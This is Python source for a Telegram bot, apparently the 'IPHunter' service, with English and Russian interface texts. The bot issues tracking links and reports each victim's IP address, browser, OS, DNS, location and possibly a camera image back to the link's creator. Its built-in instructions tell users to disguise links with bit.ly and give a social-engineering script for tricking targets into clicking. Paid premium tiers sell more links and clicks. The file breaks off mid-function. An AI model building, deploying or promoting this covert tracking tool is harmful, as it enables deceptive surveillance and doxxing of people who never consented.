#ИЗМИНИТЕ ВСЕ ДАННЫЕ В settings.json НА ВАШИ, ЗАМЕНИТЕ 'yuordomain', 'yuorbotname' НА 'yuordomain' НА ВАШ ДОМЕН САЙТ НА КОТОРОМ РАСПОЛОЖЕН flask_app.py, templates/, 32px_icon.png, 48px_icon.png И 'yuorbotname' USERNAME ВАШЕГО БОТА. В yuor_channel_id ПОСТАВЬТЕ id КАНАЛА В КОТОРЫЙ ВАШ БОТ БУДЕТ ПРОСИТЬ ПОЛЬЗОВАТЕЛЕЙ ПОДПИСАТЬСЯ ЧТОБЫ ПОЛУЧИТЬ 2 ДОП. СООБЩЕНИЯ ЕСЛИ ОНИ ЗАКОНЧАТСЯ.
#CHANGE ALL DATA IN settings.json WITH YOURS, REPLACE 'yuordomain', 'yuorbotname' WITH 'yuordomain' WITH YOUR DOMAIN SITE WHERE flask_app.py, templates/, 32px_icon.png, 48px_icon.png AND 'yuorbotname' USERNAME WITH YOURS LOCATED BOTA. IN yuor_channel_id PUT the id of the CHANNEL IN WHICH YOUR BOT WILL ASK USERS TO SUBSCRIBE TO GET 2 ADDITIONAL. MESSAGES IF THEY END OUT.

import datetime as datetime
from datetime import datetime, timedelta
from telebot import types
import telebot
import mysql.connector
import traceback
import threading
import sqlite3
import json
import time
import re
import os

texts = {
    'en': {
        'ask_delete_link_name': "Please provide the name of the link you want to delete.",
        'link_deleted': "The link '{link_name}' has been successfully deleted.",
        'link_not_found': "The link was not found or it doesn't belong to you.",
        'start': '''👋 *Hello, user!* We are glad that you logged into our bot, but before we start working, we want to clarify some points:\n\n
        *1.* Use the bot for educational purposes and without causing harm/damage.\n\n
        *2.* Administration/The owners of the bot do not bear any responsibility for your actions.\n\n
        Click on the button below⬇''',
        'confirm': '✅ Enjoy using the bot!',
        'refpromon': '❌ You need to invite at least one person using your referral link to use promo codes.',
        'menu': 'Hi👋\nChoise any button from menu:',
        'createnl': '🔗 Create new link',
        'link_created': '🔗 Your link has been created: http://yourdomain/{link_name}',
        'max_links_reached': '⚠️ You have reached the maximum limit of {max_links} links. Please purchase premium to increase your limits.',
        'ask_link_name': '🔗 Please write the name of the link (Example: {firstname}link)',
        'freeprem_reply':'🌟 Get a premium subscription for a month *absolutely free* by inviting 20 people using your referral link! 😎\n\n*Pros of premium:*\n*-Ability to create up to 10 links* ✅\n*-Endless clicks on your links!* ✅\n\nYour referral link: `{referral_link}`',
        'allinfo_menu': 'ℹ️ All Information',
        'refferals_menu' :'🔗 Referral Link',
        'buyprem_menu': '💳 Buy Premium',
        'buypremium1': '💳 You can purchase premium via *cryptocurrency*. We accept payment via:\n\n💱 *USDT*: - 0.99 USDT (for a month)\n💱 *USDT*: - 9.99 USDT (forever)\n\nPayment via bank card is also possible 💸:\n💲 *USD*: - 0.99 USD (for a month)\n💲 *USD*: - 9.99 USD (forever)\n\n🔄 To purchase, contact one of the administrators:\n🛡 *@piolaser* _(For purchase through cryptocurrency)_\n💳 *@justcpder* _(For purchase through a bank card)_',
        'sub_on_chanel':'🔔Subscribe on chanel',
        'check_sub_chanel':'🔄 Check your subscription',
        'buyprem_month':'💳 Buy Premium for a month ($1.99)',
        'buyprem_all':'💳 Buy Premium Forever ($9.99)',
        'reflink':'👥 Referral link',
        'already_for_sb':'🚫 You have already subscribed and received your +2 messages earlier.',
        'thx_for_sb':'✅ Subscription is confirmed! +2 messages have been added to you.',
        'sub_pls':'❌ You are not subscribed to the channel. Please subscribe to receive bonus messages.',
        'mylnks':'📋 My links',
        'developer': '💻 Developer',
        'langs':'🌐 Languages',
        'howuse':'❓ How to use?',
        'unlimited': 'Unlimited 🏆',
        'freeprem': '✨ FREE PREMIUM',
        'no_promos': "🚫 Currently, there are no promo codes available in our system.",
        'none_prom': "❌ The promo code is invalid.",
        'war1': '⚠️ The link name should only contain alphanumeric characters without spaces.',
        'war2':'⚠️ A link with this name already exists. Please choose a different name.',
        'nolinks':'📋 You have no links.',
        'premacc':'You have a Premium account 🎉',
        'war3':'📋 Select an option from the menu:',
        'freeprem_month':'Congratulations! You have been given a free premium for a month.',
        'prom_select':'The promo code has been successfully applied!',
        'none_prom':'Invalid promo code.',
        'netprav':'You dont have the rights for this command',
        'new_visit': "🔗 *New visit to your link* `'{link_name}'`!\n\n"
                     "🌐 *IP Address*: {ip_address}\n\n"
                     "🔍 *IPinfo*: {whois_link}\n\n"
                     "🖥 *Browser*: {browser_info}\n\n"
                     "🔗 *Referer*: {referer}\n\n"
                     "🗣 *Language*: {language}\n\n"
                     "🕒 *Visit Time*: {visit_time}\n\n"
                     "📺 *Screen Resolution*: {screen_resolution}\n\n"
                     "💻 *OS*: {os_info}\n\n"
                     "💾 *Internet Speed*: {internet_speed}\n\n"
                     "🌍 *DNS Info*: {dns_info}\n\n"
                     "📍 *Location*: {location_info}\n\n",
        'no_messages': "Someone clicked on your link! But unfortunately, you *ran out of messages*...😢\n\n"
                       "But don't worry, we have several ways for you to get more messages! ⚡\n\n"
                       "1️⃣ Subscribe to our Telegram channel and instantly get *+2 messages* to your account!\n"
                       "2️⃣ Invite friends using your referral link and get *+1 message* for each referral.\n"
                       "3️⃣ Get *FREE PREMIUM FOR A MONTH* for 20 invited users.\n"
                       "4️⃣ Buy a Premium subscription and enjoy additional privileges!:\n"
                       "*-Up to 10 links simultaneously!*\n"
                       "*-Unlimited link clicks!*\n\n"
                       "_Learn more in the /npmenu ._",
        'confirm_referral': '✅ Confirm',
        'translate_ru': '🌐 Translate to Russian',
        'new_referral': "🎉 A new user registered with your referral link! You received +1 message.",
        'max_links_reached': "⚠️ You have reached the maximum limit of {max_links} links.",
        'create_link_prompt': "🔗 Please write the name of the link (Example: yourlink)",
        'link_created': "🔗 Your link has been created: http://yourdomain/{link_name}",
        'referrals_info': '👥 *Referrals*: {refferals}\n\n🔗 *Referral Link*: `{referral_link}`',
        'account_info': '👥 *Referrals*: {refferals}\n'
                        '💬 *Message Count*: {messages_count}\n\n'
                        '🔗 *Referral Link*: `{referral_link}`\n\n'
                        '_Use the /npmenu command to see more information._',
        'new_user_registered': '🎉 A new user has registered through your referral link! You have received +1 message.',
        'help_text': ('Команды для администраторов:\n'
                    '/giveprem_month <user_id> - Выдать премиум на месяц\n'
                    '/giveprem_forever <user_id> - Выдать бессрочный премиум\n'
                    '/createPromo <код> <тип> <значение> - Создать промокод\n'
                    '/list - Посмотреть количество пользователей\n'
                    '/addnews - Добавить новость\n'
                    '/seenews - Просмотреть последнюю новость\n'
                    '/news - Отправить последнюю новость всем пользователям'),
        'prompt_promo_code': "🔑 Please enter your promo code:",
        'no_promo_code': "❌ You didn't enter a promo code. Please try again.",
        'no_referrals': "❌ You need to invite at least one person using your referral link to use promo codes.",
        'promo_used': "❌ You have already used this promo code.",
        'promo_success': "✅ Your promo code has been successfully applied!",
        'invalid_promo': "❌ Invalid promo code. Please try again.",
        'htu':" *How to use the bot?* Here's a quick explanation:\n\n"
                "1️⃣ _Click on the_ ‘🔗 Create a new link’ _button and follow the instructions._\n\n"
                "2️⃣ _Once you've created the link, you can copy it and shorten it using the service_ https://app.bitly.com/ _, to make it less suspicious to the person you plan to send the link to._ *(Optional)*\n\n"
                "3️⃣ _Send the link to the person whose information you need to gather, and use_ *social engineering* _to increase the chances of them clicking on your link._\n\n"
                "4️⃣ _Receive the information after the person clicks on the link. For better results, ask him to open the link in a third-party browser, and not directly in Telegram._\n\n"
                "*Examples of social engineering:*\n"
                "`- Hey, can you help me out?`\n"
                "`- With what?`\n"
                "`- Can you please click on my link? I made a bet with a friend, and I need to get more clicks than him. Just click the link.`\n"
                "`- Well... Alright`\n"
                "`- https://bit.ly/yourlink`\n\n"
#                "_This example relies on exploiting the natural human desire to help others by presenting one's request as innocent or even important. In social engineering this method is called: “using altruism”_\n\n"
                "_Learn more in /npmenu. (You will receive information about any transitions to your link, no matter where they came from)_",
    },
    'ru': {
        'ask_delete_link_name': "Пожалуйста, введите название ссылки, которую хотите удалить.",
        'link_deleted': "Ссылка '{link_name}' была успешно удалена.",
        'link_not_found': "Ссылка не найдена или она вам не принадлежит.",
        'start': '''👋 *Привет, пользователь!* Мы рады что ты зашёл в нашего бота, но перед началом работы мы хотим уточнить некоторые моменты:\n\n
        *1.* Используйте бота в образовательных целях и без нанесения вреда/ущерба.\n\n
        *2.* Администрация/Владельцы бота не несут никакой ответственности за ваши действия.\n\n
        Нажмите на кнопку ниже⬇''',
        'confirm': '✅ Приятного использования!',
        'refpromon': '❌ Для использования промокодов вам необходимо пригласить хотя бы одного человека по вашей реферальной ссылке.',
        'buypremium1': '💳 Вы можете приобрести премиум через *криптовалюту*. Принимаем оплату через:\n\n💱 *USDT*: - 0.99 USDT (на месяц)\n💱 *USDT*: - 9.99 USDT (навсегда)\n\nТакже возможна оплата через банковскую карту 💸:\n\n💲 *USD*: - 0.99 USD (на месяц)\n💲 *USD*: - 9.99 USD (навсегда)\n\n🔄 Для покупки свяжитесь с одним из администраторов:\n\n🛡 *@piolaser* _(Для покупки через криптовалюту)_\n💳 *@justcpder* _(Для покупки через банковскую карту)_',
        'menu': 'Привет👋\nВыбери что-нибудь из меню:',
        'createnl': '🔗 Создать новую ссылку',
        'link_created': '🔗 Ваша ссылка создана: http://yourdomain/{link_name}',
        'max_links_reached': '⚠️ Вы достигли максимального количества ссылок ({max_links}). Пожалуйста, купите премиум чтобы увеличить лимиты.',
        'ask_link_name': '🔗 Пожалуйста, напишите название ссылки (Пример: {firstname}link)',
        'freeprem_reply': '🌟 Получите премиум подписку на месяц *абсолютно бесплатно* пригласив 20 человек по ваше реферальной ссылке!😎\n\n*Плюсы премиума:*\n*-Возможность создать до 10 ссылок* ✅\n*-Бесконечные переходы по вашим ссылкам!* ✅\n\nВаша реферальная ссылка: `{referral_link}`',
        'allinfo_menu': 'ℹ️ Вся информация',
        'refferals_menu': '🔗 Реферальные ссылки',
        'buyprem_menu': '💳 Купить', 
        'sub_on_chanel':'🔔Подписаться на канал',
        'check_sub_chanel':'🔄 Проверить подписку',
        'buyprem_month':'💳 Купить Premium на месяц (1.99$)',
        'buyprem_all':'💳 Купить Premium навсегда (9.99$)',
        'reflink':'👥 Реферальная ссылка',
        'already_for_sb':'🚫 Вы уже подписаны и получили свои +2 сообщения ранее.',
        'thx_for_sb':'✅ Подписка подтверждена! Вам добавлено +2 сообщения.',
        'sub_pls':'❌ Вы не подписаны на канал. Пожалуйста, подпишитесь, чтобы получить бонусные сообщения.',
        'mylnks':'📋 Мои ссылки',
        'developer':'💻 Разработчик',
        'langs':'🌐 Языки',
        'howuse':'❓ Как использывать?',
        'freeprem':'✨ БЕСПЛАТНЫЙ ПРЕМИУМ', 
        'no_promos': "🚫 В данный момент в нашей системе нет промокодов.",
        'none_prom': "❌ Промокод неверный.",
        "war1": "⚠️ Название ссылки должно содержать только буквенно-цифровые символы без пробелов",
        "war2":"⚠️ Ссылка с таким названием уже существует. Пожалуйста, выберите другое название",
        'nolinks':'📋 У вас нет ссылок',
        "premacc": "У вас есть премиум-аккаунт🥳",
        "war3":"📋 Выберите опцию из меню:",
        'freeprem_month':'Поздравляем! Вам выдан бесплатный премиум на месяц.',
        'prom_select':'Промокод успешно применен!',
        'none_prom':'Неверный промокод.',
        'netprav':'У вас не прав для этой команды',
        'new_visit': "🔗 *Новый визит по вашей ссылке* `'{link_name}'`!\n\n"
                     "🌐 *IP-адрес*: {ip_address}\n\n"
                     "🔍 *IPinfo*: {whois_link}\n\n"
                     "🖥 *Браузер*: {browser_info}\n\n"
                     "🔗 *Реферер*: {referer}\n\n"
                     "🗣 *Язык*: {language}\n\n"
                     "🕒 *Время визита*: {visit_time}\n\n"
                     "📺 *Разрешение экрана*: {screen_resolution}\n\n"
                     "💻 *ОС*: {os_info}\n\n"
                     "💾 *Скорость Интернета*: {internet_speed}\n\n"
                     "🌍 *Информация о DNS*: {dns_info}\n\n"
                     "📍 *Местоположение*: {location_info}\n\n",
        'no_messages': "Кто-то перешёл по вашей ссылке! Но увы, у вас *закончились сообщения*...😢\n\n"
                       "Но не волнуйтесь, у нас есть несколько способов получить больше сообщений! ⚡\n\n"
                       "1️⃣ Подпишитесь на наш Telegram канал и получите сразу *+2 сообщения* на ваш аккаунт!\n"
                       "2️⃣ Приглашайте друзей по реферальной ссылке и получайте *+1 сообщение* с каждого реферала.\n"
                       "3️⃣ Получите *БЕСПЛАТНЫЙ ПРЕМИУМ НА МЕСЯЦ* за 20 приглашенных пользователей.\n"
                       "4️⃣ Купите Premium подписку и получите дополнительные привилегии!:\n"
                       "*-До 10 ссылок одновременно!*\n"
                       "*-Бесконечное количество переходов по ссылкам!*\n\n"
                       "_Подробнее в /npmenu ._",
        'htu':" *Как использовать бота?* Вот быстрое объяснение:\n\n"
                       "1️⃣ _Нажмите на кнопку_ «🔗 Создать новую ссылку»_, после чего следуйте инструкциям._\n\n"
                       "2️⃣ _Когда вы создали ссылку, можно скопировать её и сократить через сервис_ https://app.bitly.com/ _ , чтобы вызывать меньше подозрений у человека которому вы собираетесь отправить ссылку._ *(Не обязательно)*\n\n"
                       "3️⃣ _Скиньте ссылку человеку чью информацию вам нужно получить, также используйте_ *социальную инженерию*_, чтобы человек с большим шансом перешёл по вашей ссылке._\n\n"
                       "4️⃣ _Получите информацию о человеке после того как он перейдёт по ссылке. Для лучшего результата попросите его открыть ссылку в стороннем браузере, а не напрямую в телеграме._\n\n"
                       "*Примеры социальной инженерии:*\n"
                       "`- Привет, можешь помочь?`\n"
                       "`- Чем помочь?`\n"
                       "`- Можешь перейти по моей ссылке пожалуйста? Я поспорил с другом и мне нужно собрать больше переходов чем он, просто перейти по ссылке.`\n"
                       "`- Ладно`\n"
                       "`- https://bit.ly/вашассылка`\n\n"
#                       "_Этот пример опирается на эксплуатировании естественного человеческого желания помочь другим, представляя свою просьбу как невинную или даже важную. В социальной инженерии этот метод называется: «использование альтруизма»_\n\n"
                       "_Подробнее в /npmenu . (Вы получите информацию о любых переходах на вашу ссылку, без разницы откуда на неё зашли)_",
        'confirm_referral': '✅ Подтвердить',
        'translate_ru': '🌐 Перевести на русский',
        'unlimited': 'Бесконечно 🏆',
        'new_referral': "🎉 По вашей реферальной ссылке зарегистрировался новый пользователь! Вы получили +1 сообщение.",
        'max_links_reached': "⚠️ Вы достигли максимального лимита в {max_links} ссылок.",
        'create_link_prompt': "🔗 Пожалуйста, напишите название ссылки (Пример: yourlink)",
        'link_created': "🔗 Ваша ссылка создана: http://yourdomain/{link_name}",
        'referrals_info': '👥 *Рефералы*: {refferals}\n\n🔗 *Реферальная ссылка*: `{referral_link}`',
        'account_info': '👥 *Рефералы*: {refferals}\n'
                        '💬 *Количество сообщений*: {messages_count}\n\n'
                        '🔗 *Реферальная ссылка*: `{referral_link}`\n\n'
                        '_Используйте команду /npmenu , чтобы увидеть больше информации._',
        'new_user_registered': '🎉 По вашей реферальной ссылке зарегистрировался новый пользователь! Вы получили +1 сообщение.',
        'help_text': ('Команды для администраторов:\n'
                    '/giveprem_month <user_id> - Выдать премиум на месяц\n'
                    '/giveprem_forever <user_id> - Выдать бессрочный премиум\n'
                    '/createPromo <код> <тип> <значение> - Создать промокод\n'
                    '/list - Посмотреть количество пользователей\n'
                    '/addnews - Добавить новость\n'
                    '/seenews - Просмотреть последнюю новость\n'
                    '/news - Отправить последнюю новость всем пользователям'),
                'prompt_promo_code': "🔑 Пожалуйста, введите ваш промокод:",
        'no_promo_code': "❌ Вы не ввели промокод. Пожалуйста, попробуйте снова.",
        'no_referrals': "❌ Вам нужно пригласить хотя бы одного человека, используя вашу реферальную ссылку, чтобы использовать промокоды.",
        'promo_used': "❌ Вы уже использовали этот промокод.",
        'promo_success': "✅ Ваш промокод успешно применён!",
        'invalid_promo': "❌ Неверный промокод. Пожалуйста, попробуйте снова.",
    }
}

with open('settings.json', 'r') as file:
    config = json.load(file)

DB = 'databases/database.db'
TOKEN = config['token']
MYSQL_USERNAME = config['mysql_username']
MYSQL_URL = config['mysql_url']
MYSQL_DATABASE = config['mysql_databasename']
MYSQL_PASSWORD = config['mysql_password']
ADMIN_IDS = config['admins']

ADMIN_IDS = [int(id.strip()) for id in config['admins'].split(',')]

bot = telebot.TeleBot(TOKEN)

yuor_channel_id = 'PASTE HERE YOUR CHANNEL ID'

def create_db_connection():
    return mysql.connector.connect(
        host=MYSQL_URL,
        user=MYSQL_USERNAME,
        password=MYSQL_PASSWORD,
        database=MYSQL_DATABASE
    )

def get_user_language(user_id):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT language FROM users WHERE id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    language = result[0] if result else 'en'
    return language

def monitor_refers():
    while True:
        try:
            db = create_db_connection()
            cursor = db.cursor()

            cursor.execute("SELECT * FROM reffers WHERE sent_to_user=0")
            new_refers = cursor.fetchall()

            if new_refers:
                for refer in new_refers:
                    user_id_raw = str(refer[0])
                    user_id = re.sub(r'\D', '', user_id_raw)

                    if not user_id:
                        print(f"Invalid user_id '{user_id_raw}' found after cleaning. Skipping...")
                        continue

                    if not check_and_decrease_message_count(user_id):
                        continue
                    
                    lang = get_user_language(user_id)

                    link_name = refer[1]
                    ip_address = refer[3]
                    whois_link = refer[4]
                    browser_info = refer[5]
                    referer = refer[6]
                    language = refer[7]
                    visit_time = refer[8]
                    screen_resolution = refer[9]
                    os_info = refer[10]
                    internet_speed = refer[11]
                    dns_info = refer[12]
                    location_info = refer[13]
                    camera_image = refer[14]

                    message_text = texts[lang]['new_visit'].format(
                        link_name=link_name,
                        ip_address=ip_address,
                        whois_link=whois_link,
                        browser_info=browser_info,
                        referer=referer,
                        language=language,
                        visit_time=visit_time,
                        screen_resolution=screen_resolution,
                        os_info=os_info,
                        internet_speed=internet_speed,
                        dns_info=dns_info,
                        location_info=location_info
                    )

                    try:
                        if camera_image:
                            if re.match(r'^https?://', camera_image):
                                print(f"Sending photo from URL to user_id: {user_id}")
                                bot.send_photo(user_id, camera_image, caption=message_text, parse_mode='Markdown')
                            elif os.path.isfile(camera_image):
                                print(f"Sending local photo to user_id: {user_id}")
                                with open(camera_image, 'rb') as photo:
                                    bot.send_photo(user_id, photo, caption=message_text, parse_mode='Markdown')
                            else:
                                print(f"Camera image '{camera_image}' is not a valid URL or file. Skipping photo.")
                                bot.send_message(user_id, message_text, parse_mode='Markdown')
                        else:
                            bot.send_message(user_id, message_text, parse_mode='Markdown')
                        
                        cursor.execute("UPDATE reffers SET sent_to_user=1 WHERE reffer_id=%s", (refer[2],))
                        db.commit()
                    except telebot.apihelper.ApiTelegramException as e:
                        print(f"Error sending message: {e}")

            cursor.close()
            db.close()
        except mysql.connector.Error as err:
            print(f"Database error: {err}")
        except Exception as e:
            print(f"Unexpected error: {e}")
        
        time.sleep(5)

def check_and_decrease_message_count(user_id):
    lang = get_user_language(user_id)

    if is_premium(user_id):
        return True

    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('SELECT messages_count FROM messages_us WHERE user = ?', (user_id,))
    messages_data = c.fetchone()
    
    if messages_data and messages_data[0] > 0:
        c.execute('UPDATE messages_us SET messages_count = messages_count - 1 WHERE user = ?', (user_id,))
        conn.commit()
        conn.close()
        return True
    else:
        markup = types.InlineKeyboardMarkup()
        b1 = types.InlineKeyboardButton(texts[lang]['sub_on_chanel'], url='https://t.me/iphunternews')
        b2 = types.InlineKeyboardButton(texts[lang]['check_sub_chanel'], callback_data='checksubscribe')
        b3 = types.InlineKeyboardButton(texts[lang]['buyprem_month'], callback_data='buypremium')
        b4 = types.InlineKeyboardButton(texts[lang]['buyprem_all'], callback_data='buypremium')
        b5 = types.InlineKeyboardButton(texts[lang]['reflink'], callback_data='allinfo')
        markup.add(b1, b2)
        markup.add(b3, b4)
        markup.add(b5)

        message = texts[lang]['no_messages']
        with open('images/error.jpg', 'rb') as photo:
            bot.send_photo(user_id, photo, caption=message, reply_markup=markup, parse_mode='Markdown')
        conn.close()
        db = create_db_connection()
        cursor = db.cursor()

        cursor.execute("SELECT * FROM reffers WHERE sent_to_user=0")
        new_refers = cursor.fetchall()

        if new_refers:
            for refer in new_refers:
                user_id_raw = str(refer[0])
                user_id = re.sub(r'\D', '', user_id_raw)

                if not user_id:
                    print(f"Invalid user_id '{user_id_raw}' found after cleaning. Skipping...")
                    continue

        cursor.execute("UPDATE reffers SET sent_to_user=1 WHERE reffer_id=%s", (refer[2],))
        db.commit()
        return False

@bot.callback_query_handler(func=lambda call: call.data == 'checksubscribe')
def check_subscription(call):
    try:
        user_id = call.from_user.id
        chat_member = bot.get_chat_member(chat_id=yuor_channel_id, user_id=user_id)
        status = chat_member.status
        
        if status in ['member', 'administrator', 'creator']:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            c.execute('SELECT subscribed FROM subscriptions WHERE user = ?', (user_id,))
            subscribed_data = c.fetchone()

            lang = get_user_language(user_id)

            if subscribed_data and subscribed_data[0] == 1:
                bot.send_message(call.message.chat.id, texts[lang]['already_for_sb'])
            else:
                c.execute('UPDATE messages_us SET messages_count = messages_count + 2 WHERE user = ?', (user_id,))
                c.execute('INSERT OR REPLACE INTO subscriptions (user, subscribed) VALUES (?, ?)', (user_id, 1))
                conn.commit()
                bot.send_message(call.message.chat.id, texts[lang]['thx_for_sb'])
            conn.close()
        else:
            bot.send_message(call.message.chat.id, texts[lang]['sub_pls'])
    except Exception as e:
        print(f"Error in /start: {e}")
        traceback.print_exc()

@bot.message_handler(commands=['start'])
def start(message):
    try:
        user_id = message.from_user.id
        referral_id = None
        
        if len(message.text.split()) > 1:
            referral_id = message.text.split()[1]

        conn = sqlite3.connect(DB)
        c = conn.cursor()

        c.execute('SELECT id FROM users WHERE id = ?', (user_id,))
        user_exists = c.fetchone()

        if user_exists:
            lang = get_user_language(user_id)
            send_menu(message, lang)
        else:
            lang = 'en'
            markup = types.InlineKeyboardMarkup()
            btn = types.InlineKeyboardButton(texts[lang]['confirm_referral'], callback_data=f'confirm_{referral_id or ""}')
            ru = types.InlineKeyboardButton(texts[lang]['translate_ru'], callback_data='translate_ru')
            markup.add(btn, ru)
            with open('images/img1.jpg', 'rb') as photo:
                bot.send_photo(message.chat.id, photo, caption=texts[lang]['start'], reply_markup=markup, parse_mode='Markdown')

        conn.close()
    except Exception as e:
        print(f"Error in /start: {e}")
        traceback.print_exc()

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_'))
def confirm_handler(call):
    user_id = call.from_user.id
    username = call.from_user.username
    referral_id = call.data.split('_')[1] if len(call.data.split('_')) > 1 else None

    conn = sqlite3.connect(DB)
    c = conn.cursor()

    c.execute('SELECT id FROM users WHERE id = ?', (user_id,))
    user_exists = c.fetchone()

    if not user_exists:
        c.execute('INSERT INTO users (id, username, language) VALUES (?, ?, ?)', (user_id, username, 'en'))
        c.execute('INSERT INTO refferals_us (user, refferals) VALUES (?, ?)', (user_id, 0))
        initial_messages = 1

        if referral_id:
            c.execute('SELECT COUNT(*) FROM referrals WHERE user_id = ? AND referrer_id = ?', (user_id, referral_id))
            referral_exists = c.fetchone()[0]

            if referral_exists == 0:
                initial_messages += 2
                c.execute('UPDATE messages_us SET messages_count = messages_count + 1 WHERE user = ?', (referral_id,))
                c.execute('UPDATE refferals_us SET refferals = refferals + 1 WHERE user = ?', (referral_id,))

                c.execute('INSERT INTO referrals (user_id, referrer_id) VALUES (?, ?)', (user_id, referral_id))
                conn.commit()

                bot.send_message(referral_id, texts[lang]['new_user_registered'])

        c.execute('INSERT INTO messages_us (user, messages_count) VALUES (?, ?)', (user_id, initial_messages))
        conn.commit()

    lang = get_user_language(user_id)
    bot.send_message(call.message.chat.id, texts[lang]['confirm'])
    send_menu(call.message, lang)

    conn.close()

@bot.callback_query_handler(func=lambda call: call.data == 'translate_ru') 
def translate_ru(call): 
    lang = 'ru' 
    referral_id = None 
    markup = types.InlineKeyboardMarkup() 
    btn = types.InlineKeyboardButton(texts[lang]['confirm_referral'], callback_data=f'confirm_{referral_id or ""}')
    markup.add(btn)
    with open('images/img1.jpg', 'rb') as photo: 
                bot.send_photo(call.message.chat.id, photo, caption=texts[lang]['start'], reply_markup=markup, parse_mode='Markdown')

def send_menu(message, lang):
    user_id = message.from_user.id
    lang = get_user_language(user_id)

    if lang not in texts:
        lang = 'en'

    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    create_link_button = types.KeyboardButton(texts[lang]['createnl'])
    my_links_button = types.KeyboardButton(texts[lang]['mylnks'])
    languages = types.KeyboardButton(texts[lang]['langs'])
    how_to_use = types.KeyboardButton(texts[lang]['howuse'])
    get_prem_ff = types.KeyboardButton(texts[lang]['freeprem'])
    developer = types.KeyboardButton(texts[lang]['developer'])
    markup.add(create_link_button, my_links_button, languages, how_to_use, get_prem_ff, developer)
    bot.send_message(message.chat.id, texts[lang]['menu'], reply_markup=markup)


@bot.message_handler(func=lambda message: message.text in ['🌐 Languages', '🌐 Языки'])
def change_language(message):
    user_id = message.from_user.id
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_en = types.KeyboardButton("🇬🇧 English")
    btn_ru = types.KeyboardButton("🇷🇺 Русский")
    markup.add(btn_en, btn_ru)
    with open('images/languages.jpg', 'rb') as photo:
        bot.send_photo(message.chat.id, photo, caption="🌐 Please choose your language:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text in ['🇬🇧 English', '🇷🇺 Русский'])
def set_language(message):
    user_id = message.from_user.id
    language = 'en' if message.text == '🇬🇧 English' else 'ru'
    
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('UPDATE users SET language = ? WHERE id = ?', (language, user_id))
    conn.commit()
    conn.close()
    
    lang = get_user_language(user_id)

    bot.send_message(message.chat.id, f"🌐 Language changed to {'English' if language == 'en' else 'Русский'}.")
    send_menu(message, lang)

#ВЫ НЕ МОЖЕТЕ УДАЛЯТЬ ЭТУ КНОПКУ ЕСЛИ ИСПОЛЬЗУЕТЕ БОТА ДЛЯ КОММЕРЧИСКИХ ЦЕЛЕЙ ЛИБО ДЛЯ РЕАЛЬНОГО ПРОЕКТА!!!
#YOU CANNOT DELETE THIS BUTTON IF YOU ARE USING THE BOT FOR COMMERCIAL PURPOSES OR FOR A REAL PROJECT!!!
@bot.message_handler(func=lambda message: message.text in ['💻 Developer', '💻 Разработчик'])
def dev(message):
    markup = types.InlineKeyboardMarkup()
    github = types.InlineKeyboardButton('Github', url='https://github.com/justoperator/iphunter-iphunterobot-clickjacking-telegram-bot')
    orgbot = types.InlineKeyboardButton('IPHuter bot', url='https://t.me/iphunterobot')
    markup.add(github, orgbot)

    bot.send_message(message.chat.id, 'Developer', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text in ['❓ How to use?', '❓ Как использывать?'])
def how_to_use(message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)

    reply_message = texts[lang]['htu']
    with open('images/howtouse.jpg', 'rb') as photo:
        bot.send_photo(message.chat.id, photo, caption=reply_message, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text in ['🔗 Create new link', '🔗 Создать новую ссылку'])
def create_new_link(message):
    user_id = message.from_user.id
    firstname = message.from_user.first_name
    premium_status = is_premium(user_id)
    max_links = 10 if premium_status else 1
    
    db = create_db_connection()
    cursor = db.cursor()
    cursor.execute("SELECT COUNT(*) FROM links WHERE user_id=%s", (user_id,))
    count = cursor.fetchone()[0]

    lang = get_user_language(user_id)

    if count >= max_links:
        message_text = texts[lang]['max_links_reached'].format(max_links=max_links)
        bot.send_message(message.chat.id, message_text, parse_mode='Markdown')
    else:
        message_text = texts[lang]['ask_link_name'].format(firstname=firstname)
        msg = bot.send_message(message.chat.id, message_text, parse_mode='Markdown')
        bot.register_next_step_handler(msg, save_link_step)
    
    cursor.close()
    db.close()

def save_link_step(message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)
    link_name = message.text

    if not link_name.isalnum():
        bot.send_message(message.chat.id, texts[lang]['war1'])
        return

    db = create_db_connection()
    cursor = db.cursor()

    cursor.execute("SELECT COUNT(*) FROM links WHERE link_name=%s", (link_name,))
    link_exists = cursor.fetchone()[0]

    if link_exists:
        bot.send_message(message.chat.id, texts[lang]['war2'])
    else:
        cursor.execute("INSERT INTO links (user_id, link_name) VALUES (%s, %s)", (user_id, link_name))
        db.commit()

        link_created = texts[lang]['link_created'].format(link_name=link_name)
        
        bot.send_message(message.chat.id, link_created)

    cursor.close()
    db.close()


@bot.message_handler(commands=['dellink'])
def delete_link(message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)
    
    message_text = texts[lang]['ask_delete_link_name']
    msg = bot.send_message(message.chat.id, message_text, parse_mode='Markdown')
    bot.register_next_step_handler(msg, confirm_delete_link)

def confirm_delete_link(message):
    user_id = message.from_user.id
    link_name = message.text
    lang = get_user_language(user_id)

    db = create_db_connection()
    cursor = db.cursor()

    cursor.execute("SELECT COUNT(*) FROM links WHERE user_id=%s AND link_name=%s", (user_id, link_name))
    link_exists = cursor.fetchone()[0]

    if link_exists:
        cursor.execute("DELETE FROM links WHERE user_id=%s AND link_name=%s", (user_id, link_name))
        db.commit()

        message_text = texts[lang]['link_deleted'].format(link_name=link_name)
        bot.send_message(message.chat.id, message_text)
    else:
        message_text = texts[lang]['link_not_found']
        bot.send_message(message.chat.id, message_text)

    cursor.close()
    db.close()

@bot.message_handler(func=lambda message: message.text in ['📋 My links', '📋 Мои ссылки'])
def my_links(message):
    user_id = message.from_user.id
    db = create_db_connection()
    cursor = db.cursor()
    cursor.execute("SELECT link_name FROM links WHERE user_id=%s", (user_id,))
    links = cursor.fetchall()
    if links:
        with open('images/yourlinks.jpg', 'rb') as photo:
